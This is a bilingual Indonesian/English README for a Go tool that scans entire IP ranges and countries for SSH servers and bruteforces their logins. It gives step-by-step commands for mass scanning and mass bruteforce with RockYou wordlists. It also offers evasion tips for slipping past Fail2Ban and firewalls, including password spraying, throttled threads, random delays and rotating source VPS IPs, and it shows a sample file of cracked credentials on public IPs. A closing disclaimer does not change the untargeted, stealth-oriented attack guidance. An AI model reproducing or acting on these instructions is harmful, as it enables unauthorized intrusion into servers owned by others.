# GoSSHBruteforce 🔥

[![Go Version](https://img.shields.io/badge/Go-1.22+-00ADD8?style=flat&logo=go)](https://golang.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Author](https://img.shields.io/badge/Author-b2hunters.id-red.svg)](https://github.com/GhostlyrootB2H)

**Advanced SSH Scanner & Bruteforce Tool**  
*Tools canggih untuk scanning dan bruteforce SSH*

---

## 📋 **Daftar Isi | Table of Contents**
- [Fitur Utama | Key Features](#fitur-utama--key-features)
- [Instalasi | Installation](#instalasi--installation)
- [Parameter Lengkap | Complete Parameters](#parameter-lengkap--complete-parameters)
- [Penjelasan Fitur | Features Explanation](#penjelasan-fitur--features-explanation)
- [Contoh Penggunaan | Examples](#contoh-penggunaan--examples)
- [Tips & Trik | Tips & Tricks](#tips--trik--tips--tricks)
- [Hasil Bruteforce | Bruteforce Results](#hasil-bruteforce--bruteforce-results)
- [Troubleshooting](#troubleshooting)
- [Peringatan | Warning](#peringatan--warning)
- [Lisensi | License](#lisensi--license)

---

## 🚀 **Fitur Utama | Key Features**

### **🇮🇩 Bahasa Indonesia**
| Fitur | Deskripsi |
|-------|-----------|
| **Scan IP Range** | Scan jutaan IP untuk mencari server SSH yang terbuka (port 22) |
| **Scan per Negara** | Scan IP berdasarkan negara (Indonesia, Rusia, China, dll) |
| **Bruteforce SSH** | Multi-threaded SSH bruteforce dengan kecepatan tinggi |
| **Mass Bruteforce** | Serang ribuan target sekaligus dari file hasil scan |
| **Custom Wordlist** | Gunakan file username dan password sendiri |
| **Auto-Save Results** | Semua credential berhasil otomatis tersimpan |
| **Progress Bar** | Monitor real-time proses bruteforce |
| **Stealth Mode** | Bisa diatur agar tidak terdeteksi firewall |

### **🇬🇧 English**
| Feature | Description |
|---------|-------------|
| **IP Range Scan** | Scan millions of IPs for open SSH servers (port 22) |
| **Country Scan** | Scan IPs by country (Indonesia, Russia, China, etc.) |
| **SSH Bruteforce** | Multi-threaded SSH bruteforce with high speed |
| **Mass Bruteforce** | Attack thousands of targets from scan results file |
| **Custom Wordlist** | Use your own username and password files |
| **Auto-Save Results** | All successful credentials are automatically saved |
| **Progress Bar** | Real-time monitoring of bruteforce process |
| **Stealth Mode** | Configurable to avoid firewall detection |

---

## 📦 **Instalasi | Installation**

### **🇮🇩 Bahasa Indonesia**

#### **Persyaratan Sistem**
- **OS:** Linux (Ubuntu/Debian/Kali)
- **Go:** Versi 1.22 atau lebih baru
- **Masscan:** Untuk scanning IP (akan diinstall otomatis)

> **📌 CATATAN PENTING:**  
> Jika Go version Anda di bawah 1.22, proses build akan mendownload Go 1.25 secara otomatis (sekitar 140MB). Ini hanya terjadi **SATU KALI** dan akan memakan waktu 5-30 menit tergantung koneksi.

#### **Langkah Instalasi**

```bash
# 1. Clone repository
git clone https://github.com/GhostlyrootB2H/GoSSHBruteforce.git
cd GoSSHBruteforce

# 2. Install dependencies (masscan)
chmod +x scripts/install_deps.sh
sudo ./scripts/install_deps.sh

# 3. Build tools
go build -o gosshtool cmd/gosshtool/main.go

# 4. Tes apakah berhasil
./gosshtool -h
Estimasi Waktu Instalasi
Skenario	Waktu	Keterangan
Go ≥ 1.22	2-5 menit	Normal, hanya download dependencies
Go < 1.22	5-30 menit	Download Go 1.25 (140MB) + dependencies
🇬🇧 English
System Requirements
OS: Linux (Ubuntu/Debian/Kali)

Go: Version 1.22 or higher

Masscan: For IP scanning (will be installed automatically)

📌 IMPORTANT NOTE:
If your Go version is below 1.22, the build process will automatically download Go 1.25 (~140MB). This happens ONLY ONCE and will take 5-30 minutes depending on your connection.

Installation Steps
bash
# 1. Clone repository
git clone https://github.com/GhostlyrootB2H/GoSSHBruteforce.git
cd GoSSHBruteforce

# 2. Install dependencies (masscan)
chmod +x scripts/install_deps.sh
sudo ./scripts/install_deps.sh

# 3. Build tools
go build -o gosshtool cmd/gosshtool/main.go

# 4. Test if successful
./gosshtool -h
Installation Time Estimates
Scenario	Time	Description
Go ≥ 1.22	2-5 minutes	Normal, only downloading dependencies
Go < 1.22	5-30 minutes	Downloading Go 1.25 (140MB) + dependencies
🎯 Parameter Lengkap | Complete Parameters
🇮🇩 Bahasa Indonesia
Parameter	Fungsi	Contoh
-range	Scan IP range (CIDR)	-range 103.0.0.0/8
-country	Scan per negara	-country id
-L	File daftar target	-L targets.txt
-U	File username	-U users.txt
-P	File password	-P passwords.txt
-t	Jumlah thread	-t 50
-rate	Kecepatan scan (packet/detik)	-rate 50000
-output	Folder hasil	-output ./hasil
-no-scan	Lewati scanning, langsung bruteforce	-no-scan
🇬🇧 English
Parameter	Function	Example
-range	Scan IP range (CIDR)	-range 103.0.0.0/8
-country	Scan by country	-country id
-L	Target list file	-L targets.txt
-U	Username file	-U users.txt
-P	Password file	-P passwords.txt
-t	Number of threads	-t 50
-rate	Scan speed (packets/sec)	-rate 50000
-output	Output directory	-output ./results
-no-scan	Skip scanning, direct bruteforce	-no-scan
📚 Penjelasan Fitur | Features Explanation
🇮🇩 Bahasa Indonesia
1. Scan IP Range
Mencari server SSH (port 22) yang hidup di suatu range IP.

bash
sudo ./gosshtool -range 103.0.0.0/8 -rate 50000
Hasil scan tersimpan di results/live_hosts.txt dengan format IP:22 per baris.

2. Scan by Country
Scan IP berdasarkan negara. Data IP range per negara sudah disediakan di folder data/country_ranges/.

bash
sudo ./gosshtool -country id -rate 50000   # Scan Indonesia
sudo ./gosshtool -country ru -rate 50000   # Scan Rusia
sudo ./gosshtool -country cn -rate 50000   # Scan China
Kode Negara yang Tersedia:

Kode	Negara	Code	Country
id	Indonesia	jp	Japan
ru	Russia	kr	South Korea
cn	China	vn	Vietnam
us	USA	th	Thailand
my	Malaysia	sg	Singapore
in	India	br	Brazil
mx	Mexico	ph	Philippines
3. Bruteforce Single Target
Mencoba password ke satu target spesifik.

bash
echo "192.168.1.1:22" > target.txt
./gosshtool -no-scan -L target.txt -t 50
4. Mass Bruteforce
Menyerang ribuan target sekaligus dari file hasil scan.

bash
# Step 1: Scan dulu
sudo ./gosshtool -country id -rate 50000

# Step 2: Bruteforce semua hasil
./gosshtool -no-scan -L results/live_hosts.txt -t 100
5. Custom Wordlist
Menggunakan file username dan password sendiri.

bash
./gosshtool -no-scan -L target.txt -U custom_users.txt -P rockyou.txt -t 50
Lokasi Wordlist Default:

data/usernames.txt - Daftar username default (root, admin, user, dll)

data/passwords.txt - Daftar password default (root, admin, 123456, dll)

6. Menggunakan RockYou (Wordlist Raksasa)
bash
# Install rockyou
sudo apt install seclists -y
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# Gunakan
./gosshtool -no-scan -L target.txt -P /usr/share/wordlists/rockyou.txt -t 50
🇬🇧 English
1. IP Range Scan
Find live SSH servers (port 22) in an IP range.

bash
sudo ./gosshtool -range 103.0.0.0/8 -rate 50000
Results saved in results/live_hosts.txt with IP:22 format per line.

2. Country Scan
Scan IPs by country. Country IP ranges are pre-configured in data/country_ranges/ folder.

bash
sudo ./gosshtool -country id -rate 50000   # Scan Indonesia
sudo ./gosshtool -country ru -rate 50000   # Scan Russia
sudo ./gosshtool -country cn -rate 50000   # Scan China
3. Single Target Bruteforce
Try passwords on a specific target.

bash
echo "192.168.1.1:22" > target.txt
./gosshtool -no-scan -L target.txt -t 50
4. Mass Bruteforce
Attack thousands of targets from scan results file.

bash
# Step 1: Scan first
sudo ./gosshtool -country id -rate 50000

# Step 2: Bruteforce all results
./gosshtool -no-scan -L results/live_hosts.txt -t 100
5. Custom Wordlist
Use your own username and password files.

bash
./gosshtool -no-scan -L target.txt -U custom_users.txt -P rockyou.txt -t 50
Default Wordlist Location:

data/usernames.txt - Default usernames (root, admin, user, etc.)

data/passwords.txt - Default passwords (root, admin, 123456, etc.)

6. Using RockYou (Massive Wordlist)
bash
# Install rockyou
sudo apt install seclists -y
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# Use it
./gosshtool -no-scan -L target.txt -P /usr/share/wordlists/rockyou.txt -t 50
💡 Tips & Trik | Tips & Tricks
🇮🇩 Bahasa Indonesia
Agar Tidak Terdeteksi Firewall
Gunakan Thread yang Wajar (10-20 thread)

bash
./gosshtool -no-scan -L target.txt -t 15
Gunakan Password Spraying
Coba 1 password ke banyak user, bukan banyak password ke 1 user. Ini menghindari maxretry dan findtime di Fail2Ban.

Atur Delay yang Variatif
Tools ini sudah menggunakan random delay antara 1-3 detik untuk menghindari pola statis.

Gunakan Port Alternatif
Banyak server pindah port dari 22 ke port lain (contoh: 26, 2222, 22222). Selalu cek port alternatif.

Rotasi IP Sumber
Jika punya banyak VPS, distribusikan serangan ke banyak IP sumber.

Mempercepat Bruteforce
Gunakan Wordlist Besar (RockYou) - 14 juta password

Tambah Thread Bertahap - Mulai 20 → 50 → 100 (sesuai kemampuan VPS)

Gunakan Banyak Target - Satu target dengan 100 thread = lambat. Seratus target dengan 10 thread = cepat.

Analisis Hasil
Attempts: Jumlah percobaan login yang sudah dilakukan

Success: Jumlah credential yang berhasil ditemukan

Rate: Kecepatan percobaan per detik

Elapsed: Waktu yang sudah berjalan

🇬🇧 English
To Avoid Firewall Detection
Use Reasonable Threads (10-20 threads)

bash
./gosshtool -no-scan -L target.txt -t 15
Use Password Spraying
Try 1 password on many users, not many passwords on 1 user. This avoids maxretry and findtime in Fail2Ban.

Use Varied Delays
This tool already uses random delays between 1-3 seconds to avoid static patterns.

Use Alternative Ports
Many servers change SSH port from 22 to others (e.g., 26, 2222, 22222). Always check alternative ports.

Rotate Source IPs
If you have multiple VPS, distribute the attack across many source IPs.

To Speed Up Bruteforce
Use Large Wordlists (RockYou) - 14 million passwords

Increase Threads Gradually - Start at 20 → 50 → 100 (according to VPS capability)

Use Multiple Targets - One target with 100 threads = slow. Hundred targets with 10 threads = fast.

Results Analysis
Attempts: Number of login attempts made

Success: Number of successful credentials found

Rate: Attempts per second

Elapsed: Time elapsed

💾 Hasil Bruteforce | Bruteforce Results
🇮🇩 Bahasa Indonesia
Semua credential yang berhasil ditemukan otomatis tersimpan di:

text
results/credentials_found.txt
Format File:

text
[2026-03-20 10:30:45] 103.25.14.2:22 - root:toor
[2026-03-20 10:30:47] 180.241.45.67:22 - admin:admin123
[2026-03-20 10:31:02] 114.125.80.9:22 - user:password
Lihat Hasil:

bash
cat results/credentials_found.txt
# atau monitor real-time
tail -f results/credentials_found.txt
🇬🇧 English
All successful credentials are automatically saved in:

text
results/credentials_found.txt
File Format:

text
[2026-03-20 10:30:45] 103.25.14.2:22 - root:toor
[2026-03-20 10:30:47] 180.241.45.67:22 - admin:admin123
[2026-03-20 10:31:02] 114.125.80.9:22 - user:password
View Results:

bash
cat results/credentials_found.txt
# or real-time monitor
tail -f results/credentials_found.txt
🎯 Contoh Penggunaan | Examples
🇮🇩 Bahasa Indonesia
Skenario 1: Scan Indonesia + Bruteforce
bash
# Scan seluruh Indonesia (103.x.x.x)
sudo ./gosshtool -country id -rate 50000

# Bruteforce semua hasil dengan thread sedang
./gosshtool -no-scan -L results/live_hosts.txt -t 100 -P /usr/share/wordlists/rockyou.txt
Skenario 2: Target Spesifik dengan Port Alternatif
bash
# Buat file target dengan port 26
echo "101.255.167.210:26" > router.txt

# Bruteforce dengan wordlist default
./gosshtool -no-scan -L router.txt -U data/usernames.txt -P data/passwords.txt -t 30
Skenario 3: Scan Multi-Negara
bash
# Scan Indonesia, Malaysia, Singapore
sudo ./gosshtool -country id -rate 50000
sudo ./gosshtool -country my -rate 50000
sudo ./gosshtool -country sg -rate 50000

# Gabungkan hasil dan bruteforce
cat results/live_hosts.txt > semua_target.txt
./gosshtool -no-scan -L semua_target.txt -t 100
Skenario 4: Password Spraying (Anti-Detection)
bash
# Buat file berisi 1 password
echo "admin123" > satu_password.txt

# Coba ke banyak target
./gosshtool -no-scan -L results/live_hosts.txt -U data/usernames.txt -P satu_password.txt -t 10
🇬🇧 English
Scenario 1: Scan Indonesia + Bruteforce
bash
# Scan all of Indonesia (103.x.x.x)
sudo ./gosshtool -country id -rate 50000

# Bruteforce all results with medium threads
./gosshtool -no-scan -L results/live_hosts.txt -t 100 -P /usr/share/wordlists/rockyou.txt
Scenario 2: Specific Target with Alternative Port
bash
# Create target file with port 26
echo "101.255.167.210:26" > router.txt

# Bruteforce with default wordlist
./gosshtool -no-scan -L router.txt -U data/usernames.txt -P data/passwords.txt -t 30
Scenario 3: Multi-Country Scan
bash
# Scan Indonesia, Malaysia, Singapore
sudo ./gosshtool -country id -rate 50000
sudo ./gosshtool -country my -rate 50000
sudo ./gosshtool -country sg -rate 50000

# Combine results and bruteforce
cat results/live_hosts.txt > all_targets.txt
./gosshtool -no-scan -L all_targets.txt -t 100
Scenario 4: Password Spraying (Anti-Detection)
bash
# Create file with 1 password
echo "admin123" > one_password.txt

# Try on many targets
./gosshtool -no-scan -L results/live_hosts.txt -U data/usernames.txt -P one_password.txt -t 10
🔧 Troubleshooting
🇮🇩 Bahasa Indonesia
Error: "package crypto/ecdh is not in GOROOT"
Penyebab: Go version terlalu lawas (<1.22)
Solusi: Upgrade Go ke 1.22 atau lebih baru

bash
# Download Go 1.22
wget https://go.dev/dl/go1.22.10.linux-amd64.tar.gz
rm -rf /usr/local/go
tar -C /usr/local -xzf go1.22.10.linux-amd64.tar.gz
export PATH=/usr/local/go/bin:$PATH
echo 'export PATH=/usr/local/go/bin:$PATH' >> ~/.bashrc
source ~/.bashrc
Error: "masscan: command not found"
Penyebab: Masscan belum terinstall
Solusi: Jalankan sudo ./scripts/install_deps.sh

Error: "Connection refused" saat bruteforce
Penyebab:

Target mati

Port salah

Firewall memblokir

Solusi:

Cek dengan nc -zv target.com 22

Coba port alternatif (26, 2222, 22222)

Error: "Address already in use"
Penyebab: Terlalu banyak koneksi, port habis
Solusi: Kurangi thread, atau tunggu beberapa menit

Proses Build Lama (>10 menit)
Penyebab: Download Go 1.25 (karena Go version <1.22)
Solusi:

Upgrade Go dulu (lihat solusi di atas)

Atau biarkan selesai (hanya sekali)

🇬🇧 English
Error: "package crypto/ecdh is not in GOROOT"
Cause: Go version too old (<1.22)
Solution: Upgrade Go to 1.22 or newer

bash
# Download Go 1.22
wget https://go.dev/dl/go1.22.10.linux-amd64.tar.gz
rm -rf /usr/local/go
tar -C /usr/local -xzf go1.22.10.linux-amd64.tar.gz
export PATH=/usr/local/go/bin:$PATH
echo 'export PATH=/usr/local/go/bin:$PATH' >> ~/.bashrc
source ~/.bashrc
Error: "masscan: command not found"
Cause: Masscan not installed
Solution: Run sudo ./scripts/install_deps.sh

Error: "Connection refused" during bruteforce
Cause:

Target is down

Wrong port

Firewall blocking

Solution:

Check with nc -zv target.com 22

Try alternative ports (26, 2222, 22222)

Error: "Address already in use"
Cause: Too many connections, port exhaustion
Solution: Reduce threads, or wait a few minutes

Build Process Takes >10 minutes
Cause: Downloading Go 1.25 (because Go version <1.22)
Solution:

Upgrade Go first (see solution above)

Or let it finish (only once)

⚠️ Peringatan | Warning
🇮🇩 Bahasa Indonesia
TOOLS INI SANGAT BERBAHAYA JIKA DISALAHGUNAKAN!

⚠️ Ilegal: Menggunakan tools ini untuk menyerang server tanpa izin adalah tindak pidana

⚠️ UU ITE: Di Indonesia, ini melanggar Pasal 30-32 tentang akses ilegal

⚠️ Resiko: IP Anda bisa masuk daftar hitam, VPS kena suspend, atau dipenjara

⚠️ Hanya untuk: Pengujian keamanan pada sistem milik sendiri atau dengan izin tertulis

Gunakan dengan bijak dan bertanggung jawab!

🇬🇧 English
THIS TOOL IS EXTREMELY DANGEROUS IF MISUSED!

⚠️ Illegal: Using this tool to attack servers without permission is a criminal offense

⚠️ Legal Risk: In many countries, this violates computer fraud and abuse laws

⚠️ Consequences: Your IP can be blacklisted, VPS suspended, or face imprisonment

⚠️ For authorized use only: Security testing on your own systems or with written permission

Use wisely and responsibly!

📜 Lisensi | License
🇮🇩 Bahasa Indonesia
Copyright © 2026 b2hunters.id
Didistribusikan di bawah lisensi MIT. Lihat file LICENSE untuk informasi lebih lanjut.

🇬🇧 English
Copyright © 2026 b2hunters.id
Distributed under the MIT License. See LICENSE file for more information.

👨‍💻 Author
b2hunters.id
GitHub: @GhostlyrootB2H

🇮🇩 Bahasa Indonesia
Terima kasih telah menggunakan GoSSHBruteforce!
Tools ini dibuat untuk pembelajaran dan pengujian keamanan.
Jangan gunakan untuk aktivitas ilegal!

🇬🇧 English
Thank you for using GoSSHBruteforce!
This tool is created for learning and security testing purposes.
Do not use for illegal activities!

⭐ Support
If you find this tool useful, please give it a star on GitHub!
Jika tools ini bermanfaat, beri bintang di GitHub!

https://img.shields.io/github/stars/GhostlyrootB2H/GoSSHBruteforce?style=social

text

---

## 🚀 **Cara Upload ke GitHub**

```bash
# Edit README.md
nano README.md
# Copy paste semua di atas (timpa yang lama)

# Add, commit, push
git add README.md
git commit -m "Update README with complete documentation"
git push
